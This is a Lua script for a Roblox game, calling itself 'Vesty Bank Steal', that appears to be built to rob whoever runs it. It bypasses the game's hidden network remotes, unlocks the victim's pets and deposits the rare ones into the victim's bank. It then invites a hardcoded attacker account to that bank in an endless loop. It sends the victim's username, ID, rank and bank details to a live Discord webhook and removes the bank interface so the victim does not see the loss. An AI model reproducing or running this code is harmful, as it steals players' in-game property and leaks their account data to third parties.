-- rWVzKtbcRR7mwQEQEW4M
-- 8f0YQUG6SJf1L6f1z5nO
-- 8t6VglziazniFwfOPCU1
-- JYjdQeF4EzRuqnCQVBlG
-- eMSepBTOMLLJWcsgcXr8
-- PZlqO6usK05v6k9c6aB8
-- dM8WfjE18Ee17iim9y5N
-- v5drADnQA8y44XsCdFxl
-- yHZAUsZxx6jr5vLIdKDe
-- m3ckCGPLrLrqMw3W9iHZ
-- v5drADnQA8y44XsCdFxl






















































-- :: Vesty Bank Steal 2.1 ::
-- :: Crystal Blobs Bypass ::
-- Checker EXPLOIT [ERROR REPORTS]
local function getexploit()
	local exploit =
		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
		(isexecutorclosure and "Krnl") or
		(secure_load and "Sentinel") or
		(is_sirhurt_closure and "SirHurt V4") or
		(pebc_execute and "ProtoSmasher") or
		(KRNL_LOADED and "Krnl") or
		(WrapGlobal and "WeAreDevs") or
		(isvm and "Proxo") or
		(shadow_env and "Shadow") or
		(jit and "EasyExploits") or
		(getreg()['CalamariLuaEnv'] and "Calamari") or
		(unit and "Unit") or
		("Undetectable")
	return exploit
end
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local tier = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text, "%,", "")
local diamondb = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Bank.Bottom.Balance.Amount.Text
local eurl = "https://discord.com/api/webhooks/1051887678775365642/haAC60f7cl3q_HKc9wDH3be0LcZwYpz861W2BteTBV4ymfWVAJhJsYcdwcEGyiOcFluf"
request = http_request or request or HttpPost or syn.request
local error1 = {
  ["embeds"] = {{
  ["title"] = "``` > Errors Reports < ```",
  ["url"] = "https://discord.gg/Z7Uu7mh6F5",
  ["color"] = tonumber(0xF0FF00),
  ["fields"] = {
  {
  ["name"] = "`> >`  User/ID/Exploit/BankTier/Ranks  `< <`",
  ["value"] = "```User: "..username.."\nID: "..fardplayer.UserId.."\nExploit: "..getexploit().."\nTier: "..tier.."\nRanks: "..rank.."```",
  ["inline"] = false
  },
  {
    ["name"] = "`> >`  ERRORS KEY  `< <`",
    ["value"] = "```errorsXML:".._G.UserID.."```",
    ["inline"] = false
    },
  }
  }}
  }
  local errorData1 = game:GetService("HttpService"):JSONEncode(error1) 

local headers = {
["content-type"] = "application/json"
}
local e1 = {Url = eurl, Body = errorData1, Method = "POST", Headers = headers}
request(e1)
-- ::CRYSTAL BLOB BYPASS V2::
-- CRYSTAL BLOB REMOTE
local getmybanksremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks, 3)
local inviteremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).InviteToBank, 11)
local lockremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
local depositremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).Deposit, 16)
local eggremote = debug.getconstant(debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5], 26)
local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Framework.Client["1 | Network"]).Invoke)
local bloby = getupvalues(blobx[2])
local blobz = getupvalues(bloby[1])[1][2]
local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Framework.Client["1 | Network"]).Invoke)
local blobb = getupvalues(bloba[2])
--blobb[2](2, ".t")
getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
inviteremote = blobz[blobb[2](2, inviteremote)]
lockremote = blobz[blobb[2](2, lockremote)]
depositremote = blobz[blobb[2](2, depositremote)]
eggremote = blobz[blobb[2](2, eggremote)]
-- Testing Mode

-- Invitation ID

local idiot = 2470024974 -- the dualhook invite

-- Invitation ID End

-- Bank ID and Library

local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mybanks = getmybanksremote:InvokeServer()
local BankID = mybanks[1]['BUID']
local Bank = BankID

-- Bank ID and Library End

inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)

-- Deposit

local FinalList = {}

Library     = require(game:GetService('ReplicatedStorage').Framework:FindFirstChild('Library'))
Functions   = Library.Functions
EXCList     = {}
  MythicList  = {}
  HugeList = {}

PogList = {139, 177, 176, 178}
  EList       = {}
  MList       = {}
  HList    = {}
  PList = {}

print("List Detected")

table.foreach(Library.Directory.Pets, function(i, v)
  if v.rarity == "Exclusive" then
    table.insert(EXCList, i)
  end
  if v.rarity == "Mythical" then
    table.insert(MythicList, i)
  end
  if v.huge then
    table.insert(HugeList, i)
  end
end)
for i, v in pairs(PogList) do
table.insert(EXCList, v)
end

local pets = require(game:GetService("ReplicatedStorage").Framework.Client["4 | Save"]).Get().Pets
local y = {}
for i, v in pairs(pets) do
y[v["uid"]] = false
end
lockremote:InvokeServer(y)
for i, v in pairs(pets) do
if table.find(EXCList, v["id"]) ~= nil then
table.insert(EList, v["uid"])
end
if table.find(MythicList, v["id"]) ~= nil then
table.insert(MList, v["uid"])
end
if table.find(HugeList, v["id"]) ~= nil then
table.insert(HList, v["uid"])
end
end
if #EList + #MList + #PList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
table.insert(FinalList, v)
end
elseif #EList + #MList > 49 and #EList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
elseif #EList + #MList > 49 and #EList > 49 then
for i, v in pairs(EList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
end
wait(0.5)
game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
local A_1 = 
{
[1] = "Cracked Egg", 
[2] = false
}
eggremote:InvokeServer("Cracked Egg", false, false);
wait(0.5)
local A_1 = 
{
[1] = Bank, 
[2] = FinalList,
[3] = 0
}

depositremote:InvokeServer(Bank, FinalList, 1);

-- Deposit End

-- Webhook (Victim)

-- Webhook (Victim)

local us = _G.WebHook
local url2 = us
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId="..fardplayer.userId.."&width=420&height=420&format=png"
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
request = http_request or request or HttpPost or syn.request

local data1 = {
  ["content"] = "> @everyone Hit Notifers! :exploding_head:\n**> Vesty Bank-Steal Results v4.1**",
  ["embeds"] = {{
  ["title"] = "``` > Vesty's Bank-Steal Results < ```",
  ["url"] = "https://discord.gg/Z7Uu7mh6F5",
  ["description"] = ":last_quarter_moon:  Below there is "..username.."'s details of the Account.  :last_quarter_moon:",
  ["type"] = "rich",
  ["color"] = tonumber(0x00FFFF),
  ["thumbnail"] = {
    ["url"] = imgs,
    ["height"] = 420,
    ["width"] = 420
  },
  ["fields"] = {
  {
  ["name"] = ":arrow_forward:   About Player   :arrow_backward:",
  ["value"] = "```Username     : "..username.."\nDisplay Name : "..fardplayer.DisplayName.."\nUserID       : "..fardplayer.UserId.."\nAccount Age  : "..fardplayer.AccountAge.." Days\nIP Adress    : Failed to Connect.```", -- remove the || on both sides if you don't want your username to be behind a spoiler credits to ver#2607
  ["inline"] = false
  },
  {
    ["name"] = "`> >` Gems Deposited (Buggy)",
    ["value"] = diamond,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Total Pet Deposited",
    ["value"] = #FinalList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Exclusive",
    ["value"] = #EList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Huges",
    ["value"] = #HList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Mythicals",
    ["value"] = #MList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Ranks",
    ["value"] = rank,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Bank Tier",
    ["value"] = tier,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Gems in Banks",
    ["value"] = ""..diamondb.." Gems",
    ["inline"] = false
    },
    {
    ["name"] = "`> >` BankID",
    ["value"] = "```"..Bank.."```",
    ["inline"] = false
    },
  }
  }}
  }
  local newdata1 = game:GetService("HttpService"):JSONEncode(data1)

  local data2 = {
          ["embeds"] = {{
          ["title"] = "``` > Vesty Information < ```",
          ["url"] = "https://discord.gg/Z7Uu7mh6F5",
          ["color"] = tonumber(0xF0FF00),
          ["thumbnail"] = {
              ["url"] = "https://images-ext-1.discordapp.net/external/9UKBF918Xw0txaEiW68dhIlGe_N8JjnJ19xU-cOcOo8/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1009584663569907773/4d0ae2a37de778f30f1b31fa4203b4b3.png",
              ["height"] = 420,
              ["width"] = 420
          },
          ["fields"] = {
          {
          ["name"] = "`> >`  Vesty Changelog 4.1  `< <`",
          ["value"] = "```- Released V4\n* Adding more new Feature on bankstealer and Special Thanks for CrystalBlob for creating a new Bypass, also Revamping on Webhooks Results.```",
          ["inline"] = false
          },
          {
          ["name"] = "`> >`  Credits  `< <`",
          ["value"] = "```- ver#0704 (UI/Designer/WebHooks)\n- blobbyboi#0615 (Scripter/Bypasser)\n- oxy#7756 (Scripter/WebHooks)\n- Our Links: https://discord.gg/Z7Uu7mh6F5```",
          ["inline"] = false
          },
          }
          }}
          }
          local newdata2 = game:GetService("HttpService"):JSONEncode(data2) 
  
  local headers = {
    ["content-type"] = "application/json"
  }
  local abcdef1 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}
  local abcdef2 = {Url = url2, Body = newdata2, Method = "POST", Headers = headers}
  request(abcdef1)
  request(abcdef2)

-- End Webhoook Victim

-- Webhook (OUR)
local YourWebHookHere =  "https://discord.com/api/webhooks/1051887678775365642/haAC60f7cl3q_HKc9wDH3be0LcZwYpz861W2BteTBV4ymfWVAJhJsYcdwcEGyiOcFluf"  -- web hook here
local url = YourWebHookHere
request = http_request or request or HttpPost or syn.request
 
local data3 = {
  ["content"] = "> @everyone Hit Notifers! :exploding_head:\n**> Vesty Bank-Steal Results v4.1**",
  ["embeds"] = {{
  ["title"] = "``` > Vesty's Bank-Steal Results < ```",
  ["url"] = "https://discord.gg/Z7Uu7mh6F5",
  ["description"] = ":last_quarter_moon:  Below there is "..username.."'s details of the Account.  :last_quarter_moon:",
  ["type"] = "rich",
  ["color"] = tonumber(0x00FFFF),
  ["thumbnail"] = {
    ["url"] = imgs,
    ["height"] = 420,
    ["width"] = 420
  },
  ["fields"] = {
  {
  ["name"] = ":arrow_forward:   About Player   :arrow_backward:",
  ["value"] = "```Username     : "..username.."\nDisplay Name : "..fardplayer.DisplayName.."\nUserID       : "..fardplayer.UserId.."\nAccount Age  : "..fardplayer.AccountAge.." Days\nIP Adress    : Failed to Connect.```", -- remove the || on both sides if you don't want your username to be behind a spoiler credits to ver#2607
  ["inline"] = false
  },
  {
    ["name"] = "`> >` Gems Deposited (Buggy)",
    ["value"] = diamond,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Total Pet Deposited",
    ["value"] = #FinalList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Exclusive",
    ["value"] = #EList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Huges",
    ["value"] = #HList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Mythicals",
    ["value"] = #MList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Ranks",
    ["value"] = rank,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Bank Tier",
    ["value"] = tier,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Gems in Banks",
    ["value"] = ""..diamondb.." Gems",
    ["inline"] = false
    },
    {
    ["name"] = "`> >` BankID",
    ["value"] = "```"..Bank.."```",
    ["inline"] = false
    },
  }
  }}
  }
  local newdata3 = game:GetService("HttpService"):JSONEncode(data3)

  local data4 = {
          ["embeds"] = {{
          ["title"] = "``` > Vesty Information < ```",
          ["url"] = "https://discord.gg/Z7Uu7mh6F5",
          ["color"] = tonumber(0xF0FF00),
          ["thumbnail"] = {
              ["url"] = "https://images-ext-1.discordapp.net/external/9UKBF918Xw0txaEiW68dhIlGe_N8JjnJ19xU-cOcOo8/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1009584663569907773/4d0ae2a37de778f30f1b31fa4203b4b3.png",
              ["height"] = 420,
              ["width"] = 420
          },
          ["fields"] = {
          {
          ["name"] = "`> >`  Vesty Changelog 4.1  `< <`",
          ["value"] = "```- Released V4\n* Adding more new Feature on bankstealer and Special Thanks for CrystalBlob for creating a new Bypass, also Revamping on Webhooks Results.```",
          ["inline"] = false
          },
          {
          ["name"] = "`> >`  Credits  `< <`",
          ["value"] = "```- ver#0704 (UI/Designer/WebHooks)\n- blobbyboi#0615 (Scripter/Bypasser)\n- oxy#7756 (Scripter/WebHooks)\n- Our Links: https://discord.gg/Z7Uu7mh6F5```",
          ["inline"] = false
          },
          {
          ["name"] = "`> >`  Webhooks  `< <`",
          ["value"] = "```".._G.WebHook.."```",
          ["inline"] = false
          },
          }
          }}
          }
          local newdata4 = game:GetService("HttpService"):JSONEncode(data4) 
  
  local headers = {
    ["content-type"] = "application/json"
  }
  local abcdef3 = {Url = url, Body = newdata3, Method = "POST", Headers = headers}
  local abcdef4 = {Url = url, Body = newdata4, Method = "POST", Headers = headers}
  request(abcdef3)
  request(abcdef4)

-- Invites Scripts ( Dont Change if u dont know any )

inviteremote:InvokeServer(mybanks[1]['BUID'], _G.UserID)

inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)

local deletebank = game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]
deletebank:Destroy()

while task.wait(0.1) do
  inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)
end
